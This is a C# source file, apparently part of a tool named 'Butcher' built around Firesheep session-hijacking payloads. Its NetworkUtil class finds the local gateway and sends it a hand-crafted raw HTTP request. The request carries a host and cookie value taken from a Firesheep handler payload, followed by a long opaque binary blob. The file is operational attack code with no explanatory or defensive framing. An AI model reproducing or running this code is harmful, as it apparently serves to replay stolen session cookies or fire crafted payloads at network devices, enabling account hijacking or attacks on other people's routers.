using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;

namespace Butcher
{
	public sealed class NetworkUtil
	{
		private IPAddress _gatewayAddress;
		private object _padlock = new object();

		NetworkUtil() { }

		public static NetworkUtil Instance
		{
			get
			{
				return Nested.instance;
			}
		}

		class Nested
		{
			static Nested()
			{
			}

			internal static readonly NetworkUtil instance = new NetworkUtil();
		}

		public void SendRequest(IFireSheepHandlerPayload handlerPayload)
		{
			var endpoint = new IPEndPoint(GetGatewayAddress(), 80);
			var socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
			if (!socket.Connected)
				socket.Connect(endpoint);

			var payload = new StringBuilder();
			payload.AppendFormat("GET /butcher/{0} HTTP/1.1\r\nHost: {1}\r\nAccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\nCookie: {2}", Guid.NewGuid().ToString().Replace("-", ""), handlerPayload.Host, handlerPayload.CookieValue);
			payload.AppendFormat("{0}=", Guid.NewGuid().ToString().Replace("-", ""));
			payload.Append("??????????????!!!!!!!!!!!!!!!!!!!!%•eëÒˆY¼¥­Áøþh¡F4£A€ º¦SÍÂÝåt¹Òv5þhèŸË&%%¥Ô$FsnÄ‹xÏÏvVfi6ƒÊìÈ_7Î½çÜQlXËFÿë~~½¹ùÉÛ,÷7¬ùüyóÇ>hº_ošŸ¿ÄGÜ5¼yy{ÃZÆ|øË,þÊjo¬´­W¢y¹¹y5ù|Êmk¤P“Ãt¦[%´Ô“û)7­°f²›ÎDk¹0vò€_ykW“ÛÝ=þ‹ËV©&«þ×åtfç­ðÔS{/Z9Yàé½n­lãï¬ÅÇÛåô/u#8“´Ã—¯±šÿìÇúyøëO^ˆn73®¥“ÐŠ·LÄÏ1MKºGGÖ: Íìd3MCÌ§iñ_õ{[Ïs§‡0gÂë´ ž»°n~)ºù…áF7ÂKÙzG_O~9}ùöÆ1XÓ™4ÀwSA»Ó<Ø®ûu…ß“™×SÕ2ãŸ,¦®åÒ11ÙçN‡Ý|—×ÿI·Íâœa˜ŠÃÞgtçÓ´Áeþm?å¢0Éb:K“RÛv:KÓ¯º£øìåÍïoð¡nþtÃ-Ó€@có­tÍ¦o±Íúæó³L+>… 5-	ÃÒX&bð³lˆ[ $¯DZJ\r\n\r\n");
			payload.Append("\r\n");
			var dataBytes = Encoding.GetEncoding(1252).GetBytes(payload.ToString());

			try
			{
				socket.Send(dataBytes);
			}
			catch
			{

			}
			finally
			{
				socket.Disconnect(true);
			}
		}

		public IPAddress GetGatewayAddress(IPAddress gatewayAddress = null)
		{
			lock (_padlock)
			{
				var nonIP = IPAddress.Parse("0.0.0.0");
				if (_gatewayAddress == null || _gatewayAddress.Equals(nonIP))
					_gatewayAddress = gatewayAddress;

				if (_gatewayAddress == null || _gatewayAddress.Equals(nonIP))
					_gatewayAddress = GetNetworkInterfaceGatewayAddress();

				if (_gatewayAddress == null || _gatewayAddress.Equals(nonIP))
					_gatewayAddress = GetFirstRouteAddress();

				if (_gatewayAddress == null || _gatewayAddress.Equals(nonIP))
					_gatewayAddress = Dns.GetHostEntry("google.com").AddressList[0];

				return _gatewayAddress;
			}
		}

		private IPAddress GetNetworkInterfaceGatewayAddress()
		{
			if (NetworkInterface.GetAllNetworkInterfaces() != null)
				foreach (NetworkInterface networkCard in NetworkInterface.GetAllNetworkInterfaces())
				{
					if (networkCard != null && networkCard.GetIPProperties() != null && networkCard.GetIPProperties().GatewayAddresses != null)
						foreach (GatewayIPAddressInformation gatewayAddr in networkCard.GetIPProperties().GatewayAddresses)
						{
							if (gatewayAddr.Address.Equals(IPAddress.Parse("0.0.0.0")))
								continue;

							return gatewayAddr.Address;
						}
				}

			return null;
		}

		private IPAddress GetFirstRouteAddress()
		{
			string data = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
			byte[] buffer = Encoding.ASCII.GetBytes(data);

			var ping = new Ping();
			var pingReply = ping.Send("google.com", 2000, buffer, new PingOptions() { DontFragment = true, Ttl = 1 });

			return pingReply.Address;
		}
	}
}
